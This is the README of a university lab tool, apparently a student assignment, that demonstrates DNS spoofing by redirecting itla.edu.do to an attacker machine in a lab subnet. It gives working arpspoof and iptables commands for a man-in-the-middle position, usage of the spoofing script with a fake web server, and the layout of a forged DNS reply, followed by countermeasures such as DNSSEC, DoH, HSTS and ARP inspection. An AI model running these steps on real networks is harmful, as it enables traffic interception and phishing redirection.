# DNS Spoofing / DNS Poisoning Tool - Matricula: 2023-0316 | ITLA

## Objetivo del Laboratorio
Demostrar el ataque de **DNS Spoofing** interceptando consultas DNS y respondiendo con registros falsos.

**Objetivo especifico:** Hacer que itla.edu.do apunte a un servidor web local (20.23.3.16) en lugar del servidor real.

> Solo para uso educativo en entornos de laboratorio controlados.

## Requisitos
- Linux (Kali Linux recomendado)
- Python 3.8+
- pip install scapy
- pip install netfilterqueue (modo nfqueue)
- Privilegios root/sudo
- Posicion MITM (usar ARP Spoofing previo)

## Preparacion (ARP Spoofing para posicion MITM)
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 20.23.3.50 20.23.3.1 &
sudo arpspoof -i eth0 -t 20.23.3.1 20.23.3.50 &
```

## Uso
```bash
# Modo basico con servidor web falso
sudo python3 dns_spoofing.py -i eth0 --web

# Multiples dominios
sudo python3 dns_spoofing.py -i eth0 --ip-falsa 20.23.3.16 -d itla.edu.do www.itla.edu.do --web

# Modo NFQueue (requiere iptables configurado)
sudo iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0
sudo python3 dns_spoofing.py -m nfqueue --ip-falsa 20.23.3.16 -d itla.edu.do --web
```

## Parametros

| Parametro | Descripcion | Default |
|---|---|---|
| -i / --interfaz | Interfaz de red | eth0 |
| --ip-falsa | IP a devolver en respuestas DNS | 20.23.3.16 |
| -d / --dominios | Dominios a envenenar | itla.edu.do |
| -m / --modo | pasivo o nfqueue | pasivo |
| --web | Iniciar servidor web falso (puerto 80) | False |

## Topologia (Matricula: 2023-0316)
```
Red Base: 20.23.3.0/24

           DNS Real (8.8.8.8)
                  |
           GATEWAY (20.23.3.1)
                  |
        SWITCH L2 (20.23.3.0/24)
           |              |
    VICTIMA            ATACANTE
    20.23.3.50         20.23.3.16
    Windows            Kali Linux
                       - ARP Spoof
                       - DNS Spoof
                       - Web Falso

IP real itla.edu.do : (servidor legitimo)
IP falsa configurada: 20.23.3.16
```

## Funcionamiento del Script

### Flujo del Ataque
```
[1] Preparacion
    Atacante ejecuta ARP Spoofing -> posicion MITM

[2] DNS Spoofing
    Victima -> [DNS Query: itla.edu.do?] -> (pasa por atacante)
    Atacante -> intercepta UDP/53
    Atacante -> envia [DNS Response: itla.edu.do = 20.23.3.16 FALSA]
    Victima  <- recibe respuesta FALSA (antes que la real)

[3] Redireccion HTTP
    Victima -> HTTP GET itla.edu.do -> resuelve a 20.23.3.16
    Victima -> conecta al servidor web falso del atacante
    Victima <- recibe pagina web falsa

[4] Resultado
    El usuario ve una pagina falsa sin saber que fue redirigido
```

### Estructura de Respuesta DNS Falsa
```
IP  (src=DNS_SERVER, dst=CLIENTE)
  UDP (sport=53, dport=cliente_port)
    DNS
      id   = ID de la query original  <- CRITICO
      qr   = 1 (es respuesta)
      aa   = 1 (autoritativo)
      an   = DNSRR(
               rrname = itla.edu.do
               type   = A
               rdata  = 20.23.3.16  <- IP FALSA
               ttl    = 300
             )
```

## Contramediadas

### 1. DNSSEC (mas efectivo)
```
Firmas digitales en cada registro DNS.
El cliente verifica la firma antes de aceptar.
Verificar: dig +dnssec itla.edu.do
```

### 2. DNS sobre HTTPS (DoH) o TLS (DoT)
```
DoH: Consultas DNS encriptadas por HTTPS (puerto 443)
DoT: Consultas DNS encriptadas por TLS (puerto 853)
Usar: Cloudflare 1.1.1.1 o Google 8.8.8.8 con DoH/DoT
```

### 3. Proteccion ARP en el Switch (previene MITM)
```
ip arp inspection vlan 20
ip dhcp snooping vlan 20
```

### 4. HSTS (HTTP Strict Transport Security)
```
El servidor web responde con:
Strict-Transport-Security: max-age=31536000; includeSubDomains
El navegador solo acepta HTTPS, haciendo el sitio falso HTTP rechazado.
```

### 5. SSL/TLS + HTTPS
```
Usar HTTPS en todos los sitios importantes.
Certificados SSL son dominio-especificos.
El sitio falso no tendra el certificado legitimo.
El navegador mostrara advertencia de seguridad.
```

| Contramediada | Efectividad | Implementacion |
|---|---|---|
| DNSSEC | Alta | Servidor DNS |
| DoH / DoT | Alta | Cliente/OS |
| HSTS | Alta | Servidor Web |
| SSL/TLS + HTTPS | Alta | Servidor Web |
| ARP Inspection | Media | Switch L2 |
| DHCP Snooping | Media | Switch L2 |

---
*Laboratorio academico | ITLA | Matricula: 2023-0316*
